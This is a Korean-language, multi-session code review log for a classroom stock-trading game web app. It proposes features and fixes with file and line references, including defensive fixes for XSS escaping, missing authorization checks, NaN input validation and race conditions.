- **`create_deposit()` `amount` 음수·NaN·Infinity 미검증** (`app.py:772`): `amount = float((request.json or {}).get('amount', 0))`에서 클라이언트가 `"amount": -1000000` 또는 `"amount": "NaN"`을 보내면 `m.cash < amount` 조건을 통과(`-1000000 < 0` → True면 400, NaN이면 항상 False)하거나 예상치 못한 상태로 예금이 생성될 수 있음. `if not (0 < amount < float('inf')): return jsonify({'error': '금액 오류'}), 400` 한 줄을 `app.py:774` 직후에 추가하면 방어 가능.

- **포트폴리오 탭 섹터별 손익 요약 없음** (`app.js:1325-1435`, `app.py:657-688`): `loadPortfolio()` 응답의 `holdings` 배열을 `sector` 기준으로 그룹화해 섹터별 평가손익 합계를 포트폴리오 탭 상단에 요약 표시하면, 학생이 어떤 섹터에 집중 투자했고 어떤 섹터에서 손실이 발생했는지 즉시 파악 가능. `holdings`를 reduce로 집계하는 약 10줄의 클라이언트 코드만으로 서버 변경 없이 구현 가능하며, 다각화 전략 수업에 활용 효과가 큼.

- **분할 매수 기능 없음** (`app.js:1292-1322`, `index.html:538-541`): 주식 모달의 수량 입력은 정수값만 허용하고 "N주 구매" 방식이지만, 학생이 "50만원어치 매수" 처럼 금액 기준으로 구매하고 싶은 경우 수동 계산이 필요함. `trade-qty` 옆에 금액 입력 모드로 전환하는 "금액으로 매수" 토글 버튼을 추가하고, 입력된 금액을 `Math.floor(amount / S.tradePrice)`로 자동 변환해 수량으로 환산하면 편의성 향상. 서버 API는 변경 없이 클라이언트에서만 20줄 이내로 구현 가능.

---

### 제거/단순화할 것들

- **`_quiz_state`·`_quiz_settings`·`_roulette_config` 게임 종료 후 메모리 무제한 누적** (`app.py:106-130`): `_end_room()` 이 `_lots.pop(room.id, None)`, `_rlt_active.pop(room.id, None)`은 정리하지만 `_quiz_settings.pop(rid, None)`, `_roulette_config.pop(rid, None)`, 그리고 `_quiz_state`의 해당 방 항목(키 `(rid, uid)`)은 그대로 남음. 수업에서 하루에 10개 방을 생성하면 매 방의 참여자 수만큼 `_quiz_state` 항목이 영구 축적됨. `_end_room()` (`app.py:130` 직전)에 세 줄 추가:
  ```python
  _quiz_settings.pop(room.id, None)
  _roulette_config.pop(room.id, None)
  for k in [k for k in _quiz_state if k[0] == room.id]: del _quiz_state[k]
  ```

- **`resume_room()` `room.paused_at` None 미체크 → TypeError 크래시 위험** (`app.py:407`): `paused_duration = now - room.paused_at`에서 `room.paused_at`이 None이면 `TypeError: unsupported operand type(s) for -: 'datetime.datetime' and 'NoneType'`으로 500 오류 반환. `if room.status != 'paused': 400` 체크가 위에 있어 정상 흐름에서는 발생하지 않지만, DB 데이터 불일치(status='paused', paused_at=NULL) 상황에서 크래시 가능. `paused_duration = now - (room.paused_at or now)` 로 방어하거나 `if not room.paused_at: room.paused_at = now` 가드를 추가하면 안전.

- **`get_lottery()` 상태 전이(picking→drawing, drawing→revealed)에 Lock 없음** (`app.py:955-961`): 참여자 30명이 3초마다 동시 폴링하면 `cur['state'] == 'picking'` 체크와 `cur['state'] = 'drawing'` 대입 사이에 다수의 요청이 동시에 진입 가능. 특히 `drawing → revealed` 전이 시 `_do_reveal(rid, cur)`가 중복 호출되어 당첨금이 이중으로 지급될 수 있음. `_lottery_lock`이 `lottery_start()`와 `_auto_start_lottery_if_due()`에는 사용되지만 `get_lottery()` 내 전이 로직에는 없음. `app.py:955` 이후 상태 전이 블록을 `with _lottery_lock:` 으로 감싸면 해결 (`app.py:955-961` 4줄 수정).

- **`_do_reveal()` deprecated `Room.query.get(rid)` 사용** (`app.py:174`): `room = Room.query.get(rid)` 패턴이 SQLAlchemy 2.x에서 폐기됨. 06-10에 전체 교체를 권장했으나 이 함수는 누락. `db.session.get(Room, rid)`로 교체 + `if not room: return` None 가드 추가 필요.

- **`get_room()` `paused` 상태 자동 종료 미처리** (`app.py:362-364`): `if room.status == 'active' and room.end_time and datetime.utcnow() >= room.end_time:` 조건이 `paused` 상태를 제외해, 룰렛·복권으로 게임이 paused된 채 end_time이 지나면 자동 종료가 실행되지 않음. 교사가 탭을 닫으면 해당 방이 영구 paused 상태로 고착돼 새 방 생성 불가 (`app.py:310` 체크에 걸림). `room.status == 'active'` → `room.status in ('active', 'paused')` 로 확장하고 `paused` 상태의 남은 시간은 `end_time - paused_at`으로 계산해 종료 판단.

- **`loadParticipantRankings()` 및 `loadResults()` `e.username` XSS 미처리** (`app.js:1549`, `app.js:1614`): `${e.username}`이 innerHTML에 직접 삽입됨. `escHtml()` 함수가 `app.js:815`에 정의되어 있으므로 `${escHtml(e.username)}`으로 교체만 하면 즉시 방지 가능. `app.js` 전체에서 `innerHTML`에 `e.username`, `u.username` 등 사용자 입력이 포함된 변수가 사용되는 곳 일괄 점검 필요 (`host_members` 렌더링, 거래 내역 `t.note` 포함).

---

## 2026-06-18 (3차)

### 추가하면 좋을 기능

- **게임 종료 시 퀴즈·룰렛 오버레이 자동 닫기 없음** (`app.js:579-584`): `stopPolling()` → `showScreen('screen-results')` 전환 시 `quiz-overlay`와 `roulette-overlay`가 `position:fixed`로 결과 화면 위에 계속 떠 있을 수 있음. `app.js:580-583`의 `stopPolling(); stopTimer();` 직후에 `document.getElementById('quiz-overlay').style.display = 'none'; document.getElementById('roulette-overlay').style.display = 'none';` 두 줄을 추가하면 게임 종료 시 깔끔하게 닫힘. 복권 오버레이(`lottery-overlay`)도 동일 처리 필요.

- **진행자 게임 시간 연장 버튼** (`app.py:399-413`, `index.html:170-173`): 현재 `resume_room()` API는 있지만 수동 시간 연장은 없음. 수업이 늦게 시작되거나 마무리 토론이 필요할 때 교사가 원하는 분 수만큼 연장할 수 있는 `POST /api/rooms/<rid>/extend` 엔드포인트와 진행자 화면의 "+5분" 버튼 추가. `room.end_time += timedelta(minutes=ext_min)` 한 줄 + `db.session.commit()`으로 구현 완료. 현재 `pause`·`resume` 패턴을 재사용하므로 서버 10줄, 클라이언트 5줄 이내로 완성 가능.

- **게임 마지막 10초 카운트다운 알림** (`app.js:710-713`): `startTimer()` 의 `tick()` 내에서 `rem === 10`이 처음 감지될 때 `for (let i = 10; i >= 1; i--) setTimeout(() => toast(\`⏰ ${i}초!\`, 'warn'), (10 - i) * 1000)` 패턴으로 카운트다운 토스트를 예약하면 학생이 종료 직전임을 인식하고 마지막 거래를 서두를 수 있음. `navigator.vibrate?.([100])` 매초 진동을 추가하면 화면을 보지 않는 학생에게도 알림 전달. `app.js:712` 한 줄 추가로 구현 완료.

- **포트폴리오 다각화 지수 표시** (`app.js:1325-1435`, `app.py:657-688`): `loadPortfolio()` 응답의 `holdings` 배열에서 고유 섹터 수와 종목 수를 카운트해 "분산도: 3개 섹터 / 5개 종목" 형태의 간단한 지표를 포트폴리오 탭 상단 요약 카드에 추가. 특정 종목·섹터에 전액 집중한 학생에게는 "⚠️ 집중투자" 경고 뱃지를 표시하면 분산투자 개념 교육 효과. 서버 변경 없이 클라이언트 5줄로 구현 가능.

- **진행자 `host_adjust` 전체 학생 일괄 지급/차감** (`app.py:472-488`, `index.html:500-520`): 현재 단일 참여자에게만 적용 가능. `user_id` 필드를 `'all'`로 허용하고, `for m in RoomMember.query.filter_by(room_id=rid)` 루프로 전체 일괄 처리하면 이벤트 보상·벌금을 30명에게 한 번에 적용 가능. 06-12에 처음 제안됐으나 미구현. `app.py:479-488` 내에 `if target_uid == 'all':` 분기를 추가하는 것으로 50줄 내 완성.

- **룰렛 오버레이 `position:fixed` 결과 화면에서 클릭 차단** (`app.js:595-598`, `app.js:579-584`): `S.rouletteOpened = true`로 설정 후 `openRouletteModal()` 호출 시 학생이 즉시 `✕`로 닫으면 `_rltSpinning = false` 상태로 오버레이만 닫히고 `S.rouletteOpened` 플래그는 `true`로 유지됨. 이후 게임이 종료돼 결과 화면으로 이동해도 `roulette-overlay`가 `display:none`이 아니면 결과 화면 전체 클릭이 차단될 수 있음. `closeRoulette()` 내에서 `S.rouletteOpened = false`로 리셋하거나, `stopPolling()` 시 오버레이를 강제 닫는 처리 추가.

---

### 제거/단순화할 것들

- **`_show_lot_participant_picker()` 매 3초 45개 버튼 DOM 재생성** (`app.js:1995-2017`): `picking` 상태 60초 동안 3초 폴링으로 최대 20회 `_renderLotGrid('lottery-picker-grid', ...)` 호출 → 매번 45개 버튼 DOM을 삭제 후 재생성. `overlay.style.display === 'flex'`이고 picker-section이 이미 보이는 상태이면 `_lotCountdown()` 갱신만 하고 조기 반환하는 가드가 `app.js:1997-1999`에 있지만, `d.my_picks` 변경 여부 비교 없이 항상 `_lotParticipantPicks = d.my_picks || []`로 재할당 후 `_renderLotGrid` 호출 (`app.js:2001-2009`). 이미 제출한 경우(`_lotPickerSubmitted === true`)이면 그리드 재렌더 없이 카운트다운만 갱신하도록 `if (_lotPickerSubmitted) { _lotCountdown(...); return; }` 가드를 `app.js:2001` 직전에 추가.

- **`RLT_SEGS` 완전한 dead code** (`app.js:820-826`): 7줄의 상수 선언이 코드 어디서도 참조되지 않음. 06-14 (4차), 06-16, 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정. `const RLT_SEGS = [...]` 7줄 삭제만으로 해결.

- **`openRules()` 탭 상태 미초기화** (`app.js:2128`): `openModal('modal-rules')`만 호출하고 탭 초기화 없어 이전에 열었던 탭이 그대로 남음. `openRules()`에 `document.querySelector('.rules-tab')?.click()` 한 줄 추가. 06-15 (2차)에 지적됐으나 미수정.

- **`startNewsPolling()` interval 8초 고정** (`app.js:736`): 현재 8000ms로 설정되어 있음(이전 3000ms에서 개선됨). 하지만 진행자가 `news_seconds`를 300초로 설정해도 클라이언트는 8초마다 폴링을 계속함. 서버 `get_room()` 최초 응답에 `news_interval_seconds` 필드를 포함시키고, `startNewsPolling()` 호출 시 `S.room.news_interval_seconds || 8`을 인터벌로 사용하면 진행자 설정과 동기화. 폴링 주기를 줄이면 불필요한 요청이 크게 감소.

- **`execTrade()` 성공 후 `ms-holding` 로컬 갱신이 `refreshMyRank()` 재호출과 경쟁 조건** (`app.js:1313-1321`): 거래 성공 시 `S.tradeHolding`을 로컬로 증감(`app.js:1313-1318`)하고 `ms-holding`을 갱신한 뒤 `refreshMyRank()`를 호출. `refreshMyRank()`는 rankings API를 호출하는데 이 응답에는 `holdings`가 없으므로 `ms-holding`을 갱신하지 않음. 그러나 `openStockModal()`을 다시 열면 portfolio API로 실제 보유 수량을 가져와 덮어씌워 결과적으로 올바른 값이 표시됨. 로컬 갱신(`S.tradeHolding`)이 연속 거래 시 누적 오차를 일으킬 수 있으므로 `execTrade()` 성공 시 로컬 갱신 대신 portfolio API를 재호출해 정확한 값으로 동기화하는 것이 더 안전.

- **`loadResults()` 매 호출마다 `renderResultsChart()` 재생성** (`app.js:1624`): `resultsBarChart`가 이미 존재하더라도 `renderResultsChart(data)`가 `S.resultsBarChart?.destroy()`를 호출하고 새로 생성. 결과 화면은 정적이므로 `if (S.resultsBarChart) return;` 가드를 추가해 최초 1회만 렌더링하면 불필요한 Chart.js 재초기화를 방지.

---

## 2026-06-18 (4차)

### 추가하면 좋을 기능

- **게임 종료 후 룰렛 미완료 학생 자동 완료 타임아웃** (`app.py:111`, `app.py:1313-1321`): 학생이 게임 종료 후 앱을 닫거나 브라우저를 새로고침하면 `openPostGameRoulette()`가 실행되지 않아 `minigame/done`이 영원히 호출되지 않음. 진행자는 `rlt_pending > 0`으로 결과를 발표할 수 없게 됨. `_end_room()` 내에서 `threading.Timer(300, lambda: _auto_complete_rlt(room.id)).start()`로 5분 타임아웃을 등록하고, `_auto_complete_rlt()`는 `_rlt_completed[rid]`에 미완료 참가자를 일괄 추가하도록 구현. `minigame_done()` 호출 시 타이머를 취소하는 `_rlt_timers: dict` 딕셔너리도 함께 관리 권장 (`app.py:151` 직후 `_rlt_timers = {}`).

- **결과 대기 화면에서 룰렛 완료 현황 표시** (`app.js:779-789`, `index.html:634-641`): 참가자가 `screen-waiting-results`에서 "⏳ 결과 발표 대기 중" 문구만 보며 기다림. `startWaitingPoll()` 내 3초 폴링 응답의 `r.rlt_pending` 값을 활용해 `rlt_pending > 0`이면 "🎰 X명이 룰렛을 진행 중입니다 (곧 결과가 발표됩니다)" 텍스트를 동적으로 갱신하면 학생들이 대기 이유를 이해할 수 있음. `r.rlt_pending`은 이미 `room_dict()` 응답에 포함되어 있으므로 클라이언트 5줄 추가만으로 구현 완료 (`app.js:783` 참조).

- **진행자 강제 결과 발표 옵션** (`app.py:1324-1338`): 학생이 앱을 닫아 룰렛 완료가 불가능할 경우 교사가 결과를 영원히 발표할 수 없는 문제 발생. `POST /api/rooms/<rid>/host/publish-results` 요청 바디에 `{"force": true}` 파라미터를 추가하고, `app.py:1334`의 `if pending:` 블록 앞에 `force = (request.json or {}).get('force', False); if not force and pending: return 400` 형태로 강제 발표를 허용. 프론트엔드에서도 "강제 발표(confirm 후 실행)" 버튼을 `results-publish-wrap`에 추가하면 수업 마무리 시간 부족 시 탈출구 확보 가능.

- **퀴즈 오답 패널티 청산 종목 상세 토스트 알림** (`app.js:879-907`, `app.py:1230-1266`): `f2044c9` 커밋에서 퀴즈 오답 시 주식·예금까지 강제 청산하는 기능이 추가됐으나, 학생 입장에서는 `toast('❌ 오답! -N원 패널티', 'error')` 외에 어떤 종목이 청산됐는지 알 수 없음. `app.py:1269` 리턴 전에 `liquidated: [{name, shares, amount}]` 배열을 응답에 포함시키고, 클라이언트에서 청산 종목이 있으면 `"⚠ 삼성전자 10주 강제 매도됨"` 토스트를 각 항목별로 표시하면 학생이 패널티의 실체를 즉각 인식해 투자 교육 효과 향상.

- **`ending_soon` 배너에서 남은 시간 실시간 카운트다운** (`app.js:667-680`): `showEndingSoonBanner()`가 "⚡ 1분 후 게임이 종료됩니다!" 고정 텍스트만 표시. 1분 카운트다운이 시작될 때 `S.room.remaining_seconds`가 이미 응답에 포함되므로, 배너 생성 시 `let cnt = S.room.remaining_seconds || 60; const cntId = setInterval(() => { if (--cnt <= 0) clearInterval(cntId); banner.textContent = '⚡ 게임 종료까지 ' + cnt + '초!'; }, 1000)` 패턴으로 초 단위 카운트다운을 표시하면 학생의 긴박감 유도. 배너 삭제 시 `clearInterval(cntId)` 정리 필요 (`app.js:662` 참조).

- **룰렛 베팅 퀵버튼 (총자산 비율 선택)** (`index.html:561`, `app.js:1127`): 룰렛 베팅 입력창(`rlt-bet-input`)에 숫자를 직접 입력해야 함. `_rltCash` 변수가 이미 총자산 기준 값으로 설정되어 있으므로, 입력창 옆에 "10%" / "25%" / "50%" / "전액" 퀵버튼 4개를 추가하고 클릭 시 `document.getElementById('rlt-bet-input').value = Math.floor(_rltCash * pct)` 로 채우면 편의성 향상. 서버 변경 없이 HTML 4줄 + JS 4줄로 구현 완료.

- **게임 종료 직전 보유 종목 스냅샷 저장** (`app.py:134-141`, `models.py:25-38`): `_end_room()`에서 모든 `RoomHolding`을 현금 전환 후 `db.session.delete(h)`로 삭제함. 게임 종료 후 결과 화면·엑셀에서 "학생이 마지막으로 보유했던 종목 목록"을 볼 수 없어 수업 후 투자 전략 분석이 불가능. `Room` 모델에 `final_holdings_json = db.Column(db.Text, nullable=True)` 컬럼을 추가하고, `db.session.delete(h)` 직전에 보유 종목 목록을 JSON 직렬화해 저장하면 종료 후에도 종목별 매수 평균·보유량 복원 가능. 엑셀 내보내기 두 번째 시트 구현(`app.py:1386` 이후 `wb.create_sheet()`)에도 활용 가능.

---

### 제거/단순화할 것들

- **`openPostGameRoulette()` `spins_left <= 0` early return 전 `minigame/done` 미호출 → 결과 발표 영구 차단** (`app.js:1115-1121`): `data.spins_left <= 0` 또는 `data.error` 조건으로 early return 시 `api.post('.../minigame/done', {})`를 호출하지 않아 해당 학생이 `_rlt_completed`에 추가되지 않음. `host_publish_results()`가 `rlt_pending > 0`을 반환해 결과 발표가 영원히 차단됨. 스핀을 3번 모두 소진한 학생이 1명이라도 있으면 즉시 재현 가능. `app.js:1116` early return 직전에 `await api.post(\`/api/rooms/\${S.room.id}/minigame/done\`, {}).catch(()=>{})` 1줄 추가만으로 해결.

- **`_rlt_completed`·`_results_published` 인메모리 → 서버 재시작 시 결과 발표 영구 차단** (`app.py:79-81`, `app.py:1331-1335`): Render 재시작 후 `_rlt_completed[rid]`가 없어 `rlt_pending`이 전체 참가자 수로 반환되고, 진행자는 결과를 발표할 수 없게 됨. `Room` 모델에 `results_published = db.Column(db.Boolean, default=False)` 컬럼 + `RoomMember`에 `rlt_done = db.Column(db.Boolean, default=False)` 컬럼 추가로 DB에 영속화하면 재시작 후 복원 가능. `_end_room()` 내 `_results_published[room.id] = False`(`app.py:149`)는 `room.results_published = False`로 이전하고, `_rlt_completed` 인메모리 관련 코드를 DB 조회로 교체하면 일관성 확보.

- **`minigame_spin()` · `submit_quiz()` 주식 완전 청산 후 `RoomHolding` 레코드 미삭제** (`app.py:979`, `app.py:1246`): 두 함수 모두 `h.shares = 0; h.avg_price = 0`만 수행하고 `db.session.delete(h)`를 호출하지 않음. `trade()` 엔드포인트(`app.py:709`)는 `if holding.shares == 0: db.session.delete(holding)`으로 올바르게 처리하는 것과 불일치. 0주 레코드가 누적되면 `RoomHolding.query.filter_by()` 반환 크기가 비대해지고, 이후 `get_portfolio()`·청산 루프의 `h.shares <= 0: continue` 스킵이 증가. `h.shares = 0; h.avg_price = 0` 두 줄 대신 `db.session.delete(h)` 단일 호출로 교체 권장.

- **`closeRoulette()` `_rltSpinning = true` 중 호출 시 `S._postGameRoulette` 조기 리셋** (`app.js:1093`): 스핀 애니메이션(`await new Promise(r => setTimeout(r, 4300))`) 중 오버레이가 닫히면 `S._postGameRoulette = false`로 리셋됨. 4.3초 후 `doRouletteSpin()` 완료 시 `if (S._postGameRoulette)` 블록이 실행되지 않아 `minigame/done` 미호출 → 결과 발표 차단. 2026-06-14 4차·2026-06-15 2차에 반복 지적됐으나 여전히 미수정. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 1줄 추가만으로 해결.

- **`minigame_spin()` `bet` NaN 미검증 → `RoomMember.cash = NaN` 부패 위험** (`app.py:955-963`): `if bet <= 0 or bet > total_assets:` 검증에서 `float('nan') <= 0` → False, `float('nan') > total_assets` → False이므로 NaN bet이 검증을 통과. `shortfall = bet - m.cash` → NaN → 주식 청산 루프 미진입 → `m.cash = m.cash - bet + winnings` → NaN. `create_deposit()`에는 `if not (0 < amount < float('inf'))` 방어 코드가 있으나(`app.py:836`) `minigame_spin()`에는 누락. `app.py:963` 직전에 `import math; if not math.isfinite(bet): return jsonify({'error': '금액 오류'}), 400` 추가 필요.

- **`end_room()` `paused` 상태에서 1분 카운트다운 없이 즉시 종료 — 복권 미지급 위험** (`app.py:474-483`): `if room.status == 'active' and ... rid not in _ending_soon:` 조건이 `active`만 처리해, `paused` 상태에서 교사가 종료를 누르면 즉시 `_end_room()`이 호출됨. `_lots.pop(room.id, None)`으로 진행 중인 복권의 `_do_reveal()` 완료 전에 상태가 삭제돼 당첨금이 지급되지 않을 수 있음. `paused` 상태에서도 `room.status = 'active'; _ending_soon.add(rid); room.end_time = now + timedelta(seconds=60)` 처리를 추가하거나, `_lots.get(rid, {}).get('current', {}).get('state') in ('picking', 'drawing')`이면 진행 중임을 알리는 경고를 반환 권장.

- **`minigame_close()` deprecated `Room.query.get(rid)` + None 체크 누락** (`app.py:923`): `_rlt_lock` 블록 내에서 `Room.query.get(rid)` (SQLAlchemy 2.x 폐기 API)를 사용. `room`이 None이면 `room.status`, `room.paused_at` 접근 시 `AttributeError`로 500 반환. 다른 라우트가 `db.session.get(Room, rid)` 패턴을 사용하는 것과 불일치. `db.session.get(Room, rid)` + `if not room: return jsonify({'ok': True})` 명시적 None 가드로 교체하면 안전성·일관성 동시 확보.

---

## 2026-06-19

### 추가하면 좋을 기능

- **`waiting` 상태로 방치된 대기 방 자동 정리 없음** (`app.py:336-345`): `create_room()`의 stale 방 정리가 `status.in_(['active', 'paused'])` AND `end_time < stale_cutoff`인 경우만 처리(`app.py:338-344`). `waiting` 상태로 방치된 방(예: 24시간 이상 시작하지 않은 방)은 정리되지 않아 교사가 새 방을 만들 수 없는 상황이 발생. `stale_cutoff_long = datetime.utcnow() - timedelta(hours=24)` 기준으로 `Room.status == 'waiting'` AND `Room.created_at < stale_cutoff_long` 조건의 정리 분기를 `app.py:337` 이후에 추가하면 해결.

- **`get_history()` 차트 가격 생성 방향 역방향 버그** (`stock_service.py:287-310`): `price = float(current)`로 현재가에서 출발해 `for i in range(n_bars, 0, -1)`로 과거 날짜 순서대로 봉을 생성하므로, bars[0](가장 오래된 날짜)의 `open`이 현재가와 동일하고 bars[-1](가장 최근 날짜)은 무작위 가격이 됨. 학생이 차트를 보면 "30일 전 삼성전자가 현재와 같은 가격이었다"는 잘못된 인상을 받음. 수정 방법: `price = STOCKS[symbol]['base'] * random.uniform(0.85, 1.15)`로 과거 임의 시작가를 설정한 뒤 현재가 방향으로 수렴하도록 전진 생성하거나, 단순히 배열을 역순으로 생성해 bars[-1].close가 `current`에 가깝도록 수정 (`stock_service.py:288` 초기화 변경).

- **퀴즈 FAB 버튼에 쿨다운 표시 없음** (`app.py:1209-1213`, `index.html:465`): 학생이 퀴즈를 풀면 60초 쿨다운이 시작(`app.py:1286`)되는데 FAB 버튼("🧠 퀴즈")에 남은 대기시간이 표시되지 않음. 반복 클릭 시 오버레이가 열렸다 닫히며 `get_quiz()` API를 계속 호출. `openQuiz()` 내에서 `data.cooldown > 0`이면 오버레이를 열지 않고 FAB 텍스트를 "🧠 퀴즈 (N초)"로 변경하는 로컬 카운트다운을 실행하면 불필요한 API 호출과 혼란을 동시에 방지 가능 (서버 변경 불필요, `app.js` 퀴즈 관련 함수에 10줄 추가).

- **`force_price()` 이후 `_next_biases` 미갱신으로 효과 소멸** (`stock_service.py:218-242`): 교사가 개별 종목 강제 조정 시 `self._current_biases`만 갱신되지 않고, `_next_biases`에도 반영이 없음. `_maybe_generate_news()`가 다음 뉴스 사이클에서 `self._current_biases = self._next_biases.copy()`를 실행하면 강제 조정 방향이 덮어씌어져 무작위 방향으로 가격이 재진행됨. `stock_service.py:240` 이후에 `self._next_biases[symbol] = direction` 한 줄을 추가하면 강제 조정의 모멘텀이 다음 뉴스 사이클까지 유지됨. `force_sector_event()`에도 동일하게 `for sym in affected: self._next_biases[sym] = direction` 추가 권장 (`stock_service.py:260`).

- **게임 종료 후 학생별 최종 보유 종목 확인 불가** (`app.py:132-142`, `models.py:44-51`): `_end_room()`에서 `RoomHolding` 레코드를 현금으로 전환 후 전부 삭제(`db.session.delete(h)`, `app.py:140`)하여, 결과 화면이나 엑셀에서 "마지막에 어떤 종목을 보유했나"를 재현할 수 없음. `RoomMember`에 `final_portfolio = db.Column(db.Text, nullable=True)` JSON 컬럼을 추가하고 `delete(h)` 직전에 `{symbol: {shares, avg_price, final_price, gain_pct}}` 딕셔너리를 JSON 직렬화해 저장하면, 결과 화면 "내 거래 내역" 섹션과 엑셀 두 번째 시트에서 종목별 투자 전략 분석이 가능해짐 (`models.py:49` 이후 컬럼 추가, `app.py:134` 루프 내 수집 로직 추가).

- **학생이 브라우저 주소창에서 직접 방 번호를 입력하면 방 정보 노출** (`app.py:397-435`): `GET /api/rooms/<rid>` 엔드포인트가 `@login_required`만 있고 해당 방의 멤버인지 확인하지 않음. 로그인만 되면 방 코드를 모르는 타 교사의 방 이름·남은 시간·멤버 수·룰렛 설정 여부 등이 응답에 포함됨 (`room_dict()`, `app.py:252-270`). `RoomMember.query.filter_by(room_id=rid, user_id=uid).first()` 또는 `room.host_id == uid` 체크를 추가하거나, 미인가 사용자에게는 `code`·`status`·`remaining_seconds`만 포함한 최소 응답을 반환하도록 제한 권장.

---

### 제거/단순화할 것들

- **`room_dict()` 내 `member_count` COUNT 쿼리 캐시 미스 시마다 실행** (`app.py:263`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 내부에서 매번 실행됨. 로비 폴링(5초)과 `get_room()` 폴링(10초)이 맞물리면 초당 여러 건의 COUNT 쿼리가 발생. 단기적으로는 `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼을 추가해 `join_room()`·`kick_member()` 시 동기 갱신(`room.member_count += 1`)하거나, `host/lobby-members` 응답 길이를 프론트엔드에서 캐싱해 `room_dict` 호출 횟수 자체를 줄이는 방식으로 개선 가능 (`app.py:263` 한 줄).

- **`RoomHolding`·`Deposit`·`RoomTransaction` 테이블 복합 인덱스 누락** (`models.py:54-62`, `models.py:65-76`, `models.py:79-88`): 세 테이블 모두 `room_id + user_id` 기준 조회가 압도적으로 많지만 인덱스가 없음(`RoomHolding`은 `UniqueConstraint`가 있어 인덱스 자동 생성되지만, `RoomTransaction`과 `Deposit`은 없음). 학생 30명이 30분 게임을 하면 `RoomTransaction`에 수백 건이 쌓이는데, `member_total_value()` 호출 시 전체 테이블 스캔 발생. `models.py:76` 이후에 `__table_args__ = (db.Index('idx_txn_room_user', 'room_id', 'user_id'),)` 추가, `models.py:88` 이후에 `__table_args__ = (db.Index('idx_dep_room_user', 'room_id', 'user_id'),)` 추가로 즉시 해결 가능.

- **`get_quiz()` 쿨다운 체크와 상태 갱신이 원자적이지 않음** (`app.py:1200-1214`): `remaining = state.get('cooldown_until', 0) - time.time()` 체크 후 `_quiz_state[key] = {'qid': ..., 'cooldown_until': 0}` 저장 사이에 쓰레드 전환이 발생하면 두 요청이 동시에 쿨다운 없이 문제를 받을 수 있음. `threading.Lock()` (방별로 `_quiz_locks: dict = {}` 관리)으로 check-then-set을 원자화하거나, 최소한 `_quiz_state[key]`에 갱신 전 임시 마커를 먼저 저장해 중복 진입을 방지하면 공정성 확보. `submit_quiz()`의 쿨다운 설정(`app.py:1286`)도 동일한 락 내에서 처리 필요.

- **`create_room()` 방 이름 길이 검증 하한선만 있고 상한선 없음** (`app.py:333-334`): `if not name or len(name) < 2` 체크만 있어 100자 이상의 방 이름도 허용됨. `Room.name` 컬럼이 `db.String(100)`(`models.py:27`)이므로 실제로는 100자가 최대이지만, 검증 에러 없이 DB 레벨에서 잘릴 수 있음. `if len(name) > 50: return jsonify({'error': '방 이름은 50자 이하'})` 추가 + 프론트엔드 `room-name` 입력에 `maxlength="50"` 속성 추가(`index.html:63`)로 UI·서버 검증 일치 가능.

- **`_lot_round_due()` 에서 `pct >= 2/3` 조건이 게임 마지막 1/3 전체에 걸쳐 복권 트리거 가능** (`app.py:161-170`): `pct >= 2/3 and 2 not in done` 조건은 게임의 67~100% 구간 전체에서 `round=2` 복권을 트리거 가능하게 함. `_auto_start_lottery_if_due()` 가 `get_room()` 폴링마다 호출되므로, 진행자가 룰렛 직전에 `round=2` 복권을 건너뛰면 다음 폴링(10초 후)에서 즉시 재트리거될 수 있음. `lottery_skip()`이 `done` set에 round를 추가하므로 재트리거는 안 되지만, `_lot_round_due()` 로직이 `1/3 ~ 2/3` 구간에서 `round=1`, `2/3 ~ 1` 구간에서 `round=2`만을 정확히 담당한다는 주석이 없어 유지보수자가 의도를 파악하기 어려움. 조건 앞에 `# 1/3 경과 시 1회, 2/3 경과 시 2회` 주석 한 줄 추가 + 반환값 타입 힌트 `-> Optional[int]` 추가 권장 (`app.py:161`).

- **`_end_room()`에서 `db.session.commit()` 이후 인메모리 상태 정리 순서** (`app.py:141-152`): `db.session.commit()` 이후에 `cleanup_room_service()`, `_lots.pop()`, `_rlt_active.pop()` 등이 실행됨. commit 성공 후 예외가 발생해 인메모리 정리가 중단되면 (예: `_quiz_state` 정리 중 `KeyError`), 다음 `get_room()` 호출에서 이미 종료된 방에 대해 잘못된 상태가 반환될 수 있음. `try/finally` 블록으로 인메모리 정리를 보장하거나, `db.session.commit()` 전에 인메모리 상태를 로컬 변수에 미리 수집해 commit 성공 후 일괄 정리하는 방식으로 원자성 향상 가능 (`app.py:141-152` 블록 재구조화).

---

## 2026-06-19 (2차)

### 추가하면 좋을 기능

- **게임 60분 경계에서 복권 스케줄 불일치** (`app.py:168`): 최근 커밋(`d279ce2`)으로 추가된 `if total_s > 3600` 조건에서, 정확히 60분(=3600초) 게임은 2회 스케줄(1/3·2/3 주기)을 사용하고, 60분 1초(3601초) 이상 게임은 4회 스케줄(1/5·2/5·3/5·4/5 주기)을 사용함. 교사가 게임 시간을 "60분"으로 설정하면 직관적으로 4회 스케줄이 적용될 것으로 기대할 수 있어 혼란 유발. `>` 를 `>=` 로 바꾸거나, UI 상 "60분 이상이면 복권 4회" 안내 문구를 방 생성 화면(`index.html:63` 부근 게임 설정 섹션)에 추가하면 해결.

- **복권 번호 선택 화면에 "랜덤 선택" 버튼 없음** (`app.js:2106-2154`): 학생이 1~45 중 6개를 하나씩 클릭해야 해 제한 시간(60초) 내에 번호 선택을 완료하지 못하는 경우 발생. 기존 "제출하기" 버튼 옆에 "랜덤 선택" 버튼을 추가하고, 클릭 시 `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-.5).slice(0,6).sort((a,b)=>a-b)` 로 자동 선택·그리드 표시·counts 갱신하면 10초 이상 걸리는 번호 선택을 1클릭으로 단축 가능. 서버 변경 불필요, `app.js` 25줄 이내 구현.

- **참여자 게임 화면에 방 설정 정보 미표시** (`app.js:587-597`, `index.html` screen-p-game): 학생 게임 화면 상단 바에 타이머(`pg-timer`)만 있고 시작 자금·예금 금리가 전혀 보이지 않음. "예금 금리가 몇 %예요?" 질문이 수업 중 반복됨. 타이머 아래 `<div style="font-size:10px;color:var(--muted)">시작 자금 ${krw(S.room.starting_cash)} · 금리 ${S.room.deposit_rate}%</div>`를 `enterParticipantGame()` 내 `app.js:596`에서 동적으로 주입하면 한 줄로 해결.

